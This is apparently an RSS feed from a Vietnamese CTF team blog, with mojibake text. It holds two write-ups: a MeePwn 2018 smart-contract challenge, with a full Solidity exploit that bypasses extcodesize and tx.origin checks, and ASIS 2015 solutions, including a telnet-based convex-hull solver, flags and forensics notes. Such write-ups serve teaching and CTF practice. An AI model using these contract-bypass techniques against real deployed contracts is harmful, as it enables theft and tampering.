<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
>

<channel>
	<title>misc &#8211; BabyPhD CTF Team</title>
	<atom:link href="https://babyphd.net/category/misc/feed/" rel="self" type="application/rss+xml" />
	<link>https://babyphd.net</link>
	<description>NÃ³i chung Ä‘Ã¢y lÃ  má»™t khÃ¡i niá»‡m vÃ´ cÃ¹ng trá»«u tÆ°á»£ng</description>
	<lastBuildDate>Thu, 16 Aug 2018 21:09:22 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.2</generator>
<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
		<title>MEEPWN CTF 2018 - meepwn contract</title>
		<link>https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/</link>
				<pubDate>Wed, 01 Aug 2018 12:47:31 +0000</pubDate>
		<dc:creator><![CDATA[vigov5]]></dc:creator>
				<category><![CDATA[misc]]></category>
		<category><![CDATA[smartcontract]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=771</guid>
				<description><![CDATA[https://scoreboard.meepwn.team/task Source code cá»§a "gate": pragma solidity ^0.4.18; contract Meepwn_Wire { address public entrant; constructor() { entrant = msg.sender; } function isAccountAddress(address addr) private returns(bool) { uint x; assembly { x := extcodesize(caller) } return x == 0; } function exploitMe(bytes8 _key) { require(msg.sender != tx.origin); require(isAccountAddress(msg.sender)); require(msg.gas % 1337 == 0); require(uint64(_key) ^ uint64(sha3(msg.sender)) &#8230; <a href="https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - meepwn contract</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><a href="https://scoreboard.meepwn.team/task" target="_blank" rel="noopener">https://scoreboard.meepwn.team/task</a></p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/fd265c3f-adf9-428b-8bee-30682193eff2.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/fd265c3f-adf9-428b-8bee-30682193eff2.png" data-recalc-dims="1" /></p>
<p>Source code cá»§a "gate":</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract Meepwn_Wire
<span class="token punctuation">{</span>
    address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">isAccountAddress</span><span class="token punctuation">(</span>address addr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token function">returns</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        uint x<span class="token punctuation">;</span>
        assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token keyword">return</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">exploitMe</span><span class="token punctuation">(</span>bytes8 _key<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">isAccountAddress</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>gas <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><span id="more-771"></span></p>
<p>Interface cá»§a contract chÃ­nh:</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract MeePwnMain <span class="token punctuation">{</span>

  <span class="token keyword">function</span> <span class="token function">getNewInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token function">returns</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">function</span> <span class="token function">submitInstance</span><span class="token punctuation">(</span>string email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span><span class="token punctuation">(</span>bytes32<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>sau khi truy cáº­p Ä‘áº¿nÂ <a href="http://178.128.87.12/smart-contract" target="_blank" rel="noopener">http://178.128.87.12/smart-contract</a>Â nhá»¯ng viá»‡c báº¡n cáº§n lÃ m nhÆ° sau (hiá»‡n site Ä‘Ã£ khÃ´ng truy cáº­p Ä‘Æ°á»£c ná»¯a, mÃ¬nh xin phÃ©p tÃ³m táº¯t láº¡i theo...kÃ­ á»©c cá»§a mÃ¬nhÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="ğŸ˜„" class="wp-smiley" style="height: 1em; max-height: 1em;" />)</p>
<ul>
<li>Sáº½ cÃ³ má»™t contract chÃ­nh táº¡i Ä‘á»‹a chá»‰Â <a href="https://ropsten.etherscan.io/address/0x3da169ad88c8f419b57e181fe971b33993dfdc81" target="_blank" rel="noopener">0x3da169ad88c8f419b57e181fe971b33993dfdc81</a>Â Ä‘Æ°á»£c deploy trÃªn Testnet Ropsten</li>
<li>Báº¡n sáº½ gá»i hÃ mÂ <code>getNewInstance</code>Â chuyá»ƒn 0.1 ETH vÃ o Ä‘á»‹a chá»‰ nÃ y, contract chÃ­nh sáº½ deploy contractÂ <strong>Meepwn_Wire</strong>Â á»Ÿ trÃªn vÃ  gÃ¡nÂ <code>entrant = msg.sender</code>Â tá»©c lÃ  Ä‘á»‹a chá»‰ cá»§a contract chÃ­nh.</li>
<li>Nhiá»‡m vá»¥ cá»§a báº¡n lÃ m tháº¿ nÃ o Ä‘Ã³, dÃ¹ng hÃ mÂ <code>exploitMe</code>, vÆ°á»£t qua táº¥t cáº£ cÃ¡c "gate", set láº¡i biáº¿nÂ <code>entrant</code>Â thÃ nh Ä‘á»‹a chá»‰ cá»§a mÃ¬nh (pwned !)</li>
<li>Sau Ä‘Ã³ gá»i hÃ mÂ <code>submitInstance</code>Â kÃ¨m vá»›i email cá»§a mÃ¬nh Ä‘á»ƒ chá»©ng minh mÃ¬nh Ä‘Ã£ lÃ m Ä‘Æ°á»£c, Ä‘á»ƒ há»‡ thá»‘ng gá»­i flag vá» email mÃ  báº¡n submit.</li>
</ul>
<p>Vá» cÆ¡ báº£n, mÃ´ hÃ¬nh nÃ y khÃ¡ giá»‘ng vá»›iÂ <a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">Ethernaut</a>Â cá»¥ thá»ƒ hÆ¡n thÃ¬ báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm cÃ¡c bÃ i write-up cá»§a anhÂ <a href="https://viblo.asia/u/kiendinang" target="_blank" rel="noopener">@kiendinang</a>Â trÃªn Viblo, vá»›i nhiá»u cáº¥p Ä‘á»™ tá»« dá»… Ä‘áº¿n khÃ³.</p>
<h1 id="_walk-through-1">Walk Through</h1>
<p>MÃ¬nh xin tÃ³m táº¯t cÃ¡c bÆ°á»›c Ä‘á»ƒ vÆ°á»£t qua cÃ¡c gate nhÆ° sau:</p>
<h2 id="_gate-1-2">Gate 1</h2>
<p><code>require(msg.sender != tx.origin);</code>Â : Trong Solidity thÃ¬Â <code>msg.sender</code>Â lÃ  thá»©/ngÆ°á»i trá»±c tiáº¿p gá»i hÃ m cá»§a contract, cÃ²nÂ <code>tx.origin</code>Â lÃ  ngÆ°á»i táº¡o ra transaction. Do váº­yÂ <code>tx.origin</code>Â sáº½ luÃ´n lÃ  ngÆ°á»i dÃ¹ng, cÃ²nÂ <code>msg.sender</code>Â thÃ¬ cÃ³ thá»ƒ lÃ  ngÆ°á»i dÃ¹ng hoáº·c lÃ  má»™t contract khÃ¡c. Do váº­y ta cÃ³ mÃ´ hÃ¬nh sau:</p>
<pre class="language-none"><code class="language-none">A (ngÆ°á»i dÃ¹ng) -&gt; B (exploit contract) -&gt; C (Meepwn_Wire contract)
</code></pre>
<p>Vá»›i mÃ´ hÃ¬nh nÃ y sáº½ Ä‘áº£m báº£o Ä‘Æ°á»£cÂ <code>msg.sender != tx.origin</code></p>
<h2 id="_gate-2-3">Gate 2</h2>
<p><code>require(isAccountAddress(msg.sender));</code>Â : Gate nÃ y Ä‘Ãºng nhÆ° tÃªn hÃ m, kiá»ƒm tra xem Ä‘á»‹a chá»‰ Ä‘ang tÆ°Æ¡ng tÃ¡c vá»›i contract, cÃ³ pháº£i lÃ  ngÆ°á»i dÃ¹ng khÃ´ng hay lÃ  má»™t contract khÃ¡c ? vÃ Â <strong>Meepwn_Wire</strong>Â yÃªu cáº§uÂ <code>msg.sender</code>Â pháº£i lÃ  má»™t account ngÆ°á»i dÃ¹ng thÃ´ng qua viá»‡c kiá»ƒm tra storage cá»§a account cÃ³ chá»©a code hay khÃ´ng báº±ng Ä‘oáº¡n assembly (náº¿u Ä‘á»‹a chá»‰ lÃ  ngÆ°á»i dÃ¹ng thÃ¬ sáº½ codesize == 0, vÃ  ngÆ°á»£c láº¡i náº¿u Ä‘Ã³ lÃ  má»™t contract khÃ¡c)</p>
<pre class="language-js"><code class="language-js">assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
</code></pre>
<p>Náº¿u váº­y, trick chÃºng ta dÃ¹ng á»Ÿ bÆ°á»›c 1 sáº½ fail ? Tuy nhiÃªn, cÃ³ má»™t thá»i Ä‘iá»ƒm mÃ  codesize cá»§a má»™t contract báº±ng 0, Ä‘Ã³ chÃ­nh lÃ  thá»i Ä‘iá»ƒm mÃ  contract Ä‘Æ°á»£c deploy (nÃ³i cÃ¡ch khÃ¡c, khi Ä‘ang cháº¡y contructor cá»§a contract), nhÆ° Ä‘Æ°á»£c note trongÂ <a href="https://github.com/ethereum/yellowpaper" target="_blank" rel="noopener">yellow paper</a>Â cá»§a Ethereum. Váº­y Ä‘á»ƒ pass qua gate nÃ y, ta cáº§n thá»±c hiá»‡n exploit trong contructor cá»§a contract. Äáº¿n Ä‘Ã¢y ta cÃ³ thá»ƒ xÃ¢y dá»±ng Ä‘Æ°á»£c contract táº¡m thá»i dÃ¹ng Ä‘á»ƒ exploit nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">exploitMe</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>vá»›i target lÃ  Ä‘á»‹a chá»‰ cá»§a contractÂ <code>Meepwn_Wire</code>Â mÃ  contract chÃ­nh Ä‘Ã£ deploy. Äá»ƒ biáº¿t Ä‘Æ°á»£c Ä‘á»‹a chá»‰ nÃ y, báº¡n cÃ³ thá»ƒ tÃ¬m Ä‘áº¿n transactionÂ <code>getNewInstance</code>Â trÃªnÂ <a href="https://ropsten.etherscan.io/" target="_blank" rel="noopener">https://ropsten.etherscan.io/</a>Â vÃ  kiá»ƒm tra tabÂ <code>Internal Transactions</code>.</p>
<h2 id="_gate-3-4">Gate 3</h2>
<p><code>require(msg.gas % 1337 == 0);</code>Â : Gate nÃ y yÃªu cáº§u sá»‘ gas cÃ²n láº¡i (<code>msg.gas</code>) táº¡i thá»i Ä‘iá»ƒm thá»±c hiá»‡n kiá»ƒm tra pháº£i chia háº¿t cho 1337. Äá»ƒ thá»±c hiá»‡n Ä‘iá»u nÃ y, ta cÃ³ thá»ƒ gá»i hÃ mÂ <code>exploitMe</code>Â theo cÃ¡ch sau:</p>
<pre class="language-js"><code class="language-js">t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span>
</code></pre>
<p>vá»›iÂ <code>xxx</code>Â lÃ  sá»‘ gas dÃ¹ng Ä‘á»ƒ cháº¡y hÃ mÂ <code>exploitMe</code>. NhÆ° váº­y chÃºng ta sáº½ control Ä‘Æ°á»£c sá»‘ gas truyá»n vÃ o. Váº­y truyá»n vÃ o bao nhiÃªu gas Ä‘á»ƒ thoáº£ mÃ£n ? MÃ¬nh sáº½ lÃ m theo cÃ¡ch thá»­ saim truyá»n vÃ o 1 sá»‘ gas tuá»³ Ã½, vÃ  kiá»ƒm tra instruction trÃªn Remix.</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">98000</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>VÃ­ dá»¥ cháº¡y vá»›i gas 98000, cháº¯c cháº¯n transaction sáº½ fail, báº±ng sá»­ dá»¥ng mÃ´i trÆ°á»ng Javascript VM trÃªn Remix sáº½ cho phÃ©p chÃºng ta debug:<img class="medium-zoom-image" src="https://i2.wp.com/images.viblo.asia/a22a0df6-77f0-4920-b715-634fa749ffda.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/a22a0df6-77f0-4920-b715-634fa749ffda.png" data-recalc-dims="1" /></p>
<p>ClickÂ <code>Debug</code>, má»Ÿ pháº§nÂ <code>Instructions</code>Â vÃ Â <code>Stack</code>Â vÃ  step qua tá»«ng instruction cho Ä‘áº¿n Ä‘oáº¡n kiá»ƒm tra sá»‘ gas:</p>
<p><img class="medium-zoom-image" src="https://i1.wp.com/images.viblo.asia/bd209629-0feb-4b81-934e-bb8d9d5f8705.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/bd209629-0feb-4b81-934e-bb8d9d5f8705.png" data-recalc-dims="1" /></p>
<p>IP hiá»‡n Ä‘ang á»Ÿ 363, ngay sau khi chÃºng ta cháº¡y xongÂ <code>GAS</code>, top stack lÃºc nÃ y sáº½ chÃ­nh lÃ  sá»‘ gas cÃ²n láº¡i:Â <code>0x17abc = 96956</code>Â (táº¡i ngÄƒn tiáº¿p theo chÃ­nh lÃ  giÃ¡ trá»‹Â <code>0x539</code>Â = 1337). Váº­y ta sáº½ cÃ³ gas thoáº£ mÃ£n lÃ :</p>
<pre class="language-none"><code class="language-none">98000 - 96956 % 1337 = 97308
</code></pre>
<p><strong>Note</strong>: Äá»ƒ Ä‘áº£m báº£o debug Ä‘Ãºng thÃ¬ version compiler vÃ  thiáº¿t láº­p optimize cá»§a báº¡n vÃ  Ä‘á» bÃ i pháº£i giá»‘ng nhau, ráº¥t may, Ä‘á»u Ä‘ang lÃ  versionÂ <code>soljson-v0.4.24+commit.e67f0147.js</code>Â <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="ğŸ˜„" class="wp-smiley" style="height: 1em; max-height: 1em;" />, cÆ¡ mÃ  náº¿u cÃ³ sai thÃ¬ cÅ©ng sai khÃ¡c nhau khÃ´ng quÃ¡ 100 gas, chÃºng ta cÃ³ thá»ƒ brute-force Ä‘Æ°á»£cÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f606.png" alt="ğŸ˜†" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<h2 id="_gate-4-5">Gate 4</h2>
<p><code>require(uint64(_key) ^ uint64(sha3(msg.sender)) ^ uint64(sha3(address(this))) == 0x13371337);</code>Â : gate nÃ y lÃ  khÃ¡ Ä‘Æ¡n giáº£n (tuy nhiÃªn trong thá»i gian thi BTC Ä‘Ã£ khÃ´ng may Ä‘eploy nháº§m source code Ä‘oáº¡n nÃ y khiáº¿n cÃ¡c Ä‘á»™i thi tá»‘n cá»¡ "1 tiáº¿ng" tÃ¬m cÃ¡ch brute-force 8 bytes sha3 (náº¿u thá»±c sá»± cÃ³ team Ä‘á»‹nh lÃ m váº­yÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f605.png" alt="ğŸ˜…" class="wp-smiley" style="height: 1em; max-height: 1em;" />)), Ä‘Ã¢y lÃ  phÃ©p XOR vÃ  chÃºng ta lÃ m láº¡i nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">_key <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span>

</code></pre>
<p><code>this</code>Â á»Ÿ Ä‘Ã¢y sáº½ cho ra Ä‘á»‹a chá»‰ contract exploit cá»§a chÃºng ta.</p>
<h2 id="_full-exploit-6">Full Exploit</h2>
<p>(Test thá»­ trÃªn Remix trÆ°á»›c cho cháº¯c Äƒn rá»“i hÃ£y submit nhÃ©)</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">97308</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Viá»‡c cÃ²n láº¡i lÃ  thá»±c hiá»‡nÂ <code>submitInstance</code>Â vÃ  chá» mail flag vá»:</p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png" data-recalc-dims="1" /></p>
<h1 id="_references-7">References</h1>
<ul>
<li><a href="https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db" target="_blank" rel="noopener">https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db</a></li>
<li><a href="http://solidity.readthedocs.io/en/v0.4.24/" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.24/</a></li>
</ul>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">771</post-id>	</item>
		<item>
		<title>ASIS Quals CTF 2015 - grids, keka-bomb, dump Writeup</title>
		<link>https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/</link>
				<pubDate>Tue, 12 May 2015 09:57:45 +0000</pubDate>
		<dc:creator><![CDATA[gaylord]]></dc:creator>
				<category><![CDATA[forensic]]></category>
		<category><![CDATA[misc]]></category>
		<category><![CDATA[vietnamese]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=334</guid>
				<description><![CDATA[Programming 300 - grids Äá» bÃ i nháº­n Ä‘Æ°á»£c lÃ  cho 1 táº­p há»£p Ä‘iá»ƒm trÃªn máº·t pháº³ng 2D, cáº§n tÃ¬m diá»‡n tÃ­ch Ä‘a giÃ¡c lá»›n nháº¥t táº¡o Ä‘Æ°á»£c mÃ  cÃ¡c Ä‘á»‰nh cá»§a Ä‘a giÃ¡c Ä‘Æ°á»£c láº¥y tá»« táº­p há»£p Ä‘iá»ƒm Ä‘Ã£ cho. Dá»… tháº¥y lÃ  Ä‘a giÃ¡c cáº§n tÃ¬m cáº§n bao trá»n toÃ n bá»™ táº­p &#8230; <a href="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/" class="more-link">Continue reading <span class="screen-reader-text">ASIS Quals CTF 2015 - grids, keka-bomb, dump Writeup</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><strong>Programming 300 - grids</strong></p>
<p>Äá» bÃ i nháº­n Ä‘Æ°á»£c lÃ  cho 1 táº­p há»£p Ä‘iá»ƒm trÃªn máº·t pháº³ng 2D, cáº§n tÃ¬m diá»‡n tÃ­ch Ä‘a giÃ¡c lá»›n nháº¥t táº¡o Ä‘Æ°á»£c mÃ  cÃ¡c Ä‘á»‰nh cá»§a Ä‘a giÃ¡c Ä‘Æ°á»£c láº¥y tá»« táº­p há»£p Ä‘iá»ƒm Ä‘Ã£ cho. Dá»… tháº¥y lÃ  Ä‘a giÃ¡c cáº§n tÃ¬m cáº§n bao trá»n toÃ n bá»™ táº­p Ä‘iá»ƒm, nÃªn bÃ i toÃ¡n quy vá» viá»‡c tÃ­nh diá»‡n tÃ­ch <a href="http://en.wikipedia.org/wiki/Convex_hull">bao lá»“i</a> cá»§a táº­p Ä‘iá»ƒm nÃ y.</p>
<p>CÃ³ thá»ƒ dÃ¹ng <a href="http://en.wikipedia.org/wiki/Graham_scan">thuáº­t toÃ¡n quÃ©t Graham</a> Ä‘á»ƒ tÃ¬m bao lá»“i sau Ä‘Ã³ dÃ¹ng <a href="http://en.wikipedia.org/wiki/Shoelace_formula">cÃ´ng thá»©c tÃ­nh diá»‡n tÃ­ch cá»§a Gauss</a> Ä‘á»ƒ tÃ­nh diá»‡n tÃ­ch Ä‘a giÃ¡c vá»«a tÃ¬m Ä‘Æ°á»£c. NhÆ°ng trong SciPy Ä‘Ã£ cÃ³ <a href="http://docs.scipy.org/doc/scipy-dev/reference/generated/scipy.spatial.ConvexHull.html">code tÃ¬m bao lá»“i</a> nÃªn mÃ¬nh khÃ´ng cáº§n pháº£i code láº¡i pháº§n bao lá»“i ná»¯a :))</p>
<p>Code cá»§a mÃ¬nh (mÃ¬nh k biáº¿t chÃ¨n gist vÃ o Ä‘Ã¢y nhÆ° tháº¿ nÃ o :&lt;):</p>
<pre class="font:consolas lang:python decode:true" title="asisctf_grids">from scipy.spatial import ConvexHull
import numpy as np
import ast
import telnetlib
import re
 
class Telnet(telnetlib.Telnet):
    # inherit from Telnetlib and add new method
    def __init__(self,host,port):
        telnetlib.Telnet.__init__(self,host,port)
    # make easier when you want to send raw data to server
    def writeRawData(self,data):
        return self.get_socket().send(data)
 
    def recvRawData(self,size):
        return self.get_socket().recv(size)
 
# Calculate algebraic area of a polygon using shoelace formula
def area(vertices):
    n = len(vertices)
    area = 0.0
    for i in range(n):
        j = (i + 1) % n
        area += vertices[i][0] * vertices[j][1]
        area -= vertices[j][0] * vertices[i][1]
    area /= 2.0
    return area
 
host = '217.218.48.84'
port = 12432
 
# connect
tel = Telnet(host, port)
s = tel.read_until('Are you ready for this challenge?\n')
print s,
# reply
print 'yes'
tel.writeRawData('yes\n')
s = tel.read_until('OK, OK, lets start\n')
print s,
# solve
for i in range(99):
    print '[*] %d-th round' % i
    s = tel.read_until("What's the area?")
    print s,
    l = np.array(ast.literal_eval(re.findall(r'\n(<p style='text-align:center;'><span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_4fd4a56c435d5c26b3c3c366f51b074e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none;' class='tex' alt="" data-recalc-dims="1" /></span></p>)\n', s)[0]))
    hull = ConvexHull(l)
    vertices = l[hull.vertices]
    res = abs(area(vertices))
    print res
    tel.writeRawData(str(res)+'\n')
# get flag
tel.interact()</pre>
<p>Flag lÃ </p>
<pre>ASIS{f3a8369f4194c5e44c03e5fcefb8ddf6}</pre>
<p><strong>Forensics 75 - Keka Bomb</strong></p>
<p>File Ä‘Ã£ cho lÃ  má»™t file 7z vÃ  bÃªn trong nÃ³ gá»“m nhiá»u file 7z con vá»›i dung lÆ°á»£ng má»—i file khoáº£ng 4GB : 0009.7z -&gt; 0000007.7z -&gt; 0000000008.7z -&gt; bomb_8, má»Ÿ file nÃ y báº±ng HxD, tÃ¬m chuá»—i "ASIS" sáº½ tháº¥y flag:</p>
<pre>ASIS{f974da3203d155826974f4a66735a20b}</pre>
<p><strong> Forensics 250 - Dump</strong><br />
File trong Ä‘á» lÃ  1 file .sav cá»§a VirtualBox nháº­n Ä‘Æ°á»£c khi táº¡o snapshot hoáº·c suspend mÃ¡y áº£o. File chá»‰ chá»©a má»™t pháº§n RAM Ä‘Ã£ Ä‘Æ°á»£c sá»­ dá»¥ng vÃ  Ä‘Æ°á»£c sáº¯p xáº¿p theo má»™t tráº­t tá»± khÃ´ng nháº¥t Ä‘á»‹nh nÃªn (theo quÃ¡ trÃ¬nh Google cá»§a mÃ¬nh) khÃ´ng thá»ƒ láº¥y trá»±c tiáº¿p thÃ´ng tin trÃªn Ä‘Ã¢y Ä‘Æ°á»£c :&lt;, mÃ  cáº§n pháº£i cháº¡y file .sav trÃªn VirtualBox rá»“i táº¡o core dump hoáº·c memdump sau Ä‘áº¥y má»›i phÃ¢n tÃ­ch Ä‘Æ°á»£c.</p>
